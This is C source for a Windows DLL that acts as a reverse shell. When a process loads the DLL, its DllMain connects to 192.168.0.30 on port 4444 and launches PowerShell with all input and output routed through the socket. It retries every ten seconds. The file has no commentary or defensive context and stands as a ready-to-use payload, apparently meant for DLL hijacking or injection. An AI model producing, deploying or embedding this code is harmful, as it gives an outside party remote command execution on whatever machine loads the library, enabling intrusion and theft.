#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>

#define SERVER_IP "192.168.0.30"
#define SERVER_PORT 4444

BOOL APIENTRY DllMain(HANDLE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);

            struct sockaddr_in hints;
            hints.sin_family = AF_INET,
            hints.sin_port = htons(SERVER_PORT),
            hints.sin_addr.s_addr = inet_addr(SERVER_IP);

            while (1) {
                SOCKET sock; 
                sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

                if (WSAConnect(sock, (SOCKADDR *)&hints, sizeof(hints), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
                    closesocket(sock);
                    Sleep(10000);
                    continue;
                }

                if (sock == INVALID_SOCKET) {
                    Sleep(10000);
                    continue;
                }

                STARTUPINFOW si;
                memset(&si, 0, sizeof(si));
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESTDHANDLES;
                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

                PROCESS_INFORMATION pi;
                CreateProcessW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                            NULL, NULL, NULL, TRUE, 0, NULL, L"C:\\", &si, &pi);

                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                closesocket(sock);
            }
        break;
        case DLL_THREAD_ATTACH:
        break;
        case DLL_THREAD_DETACH:
        break;
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
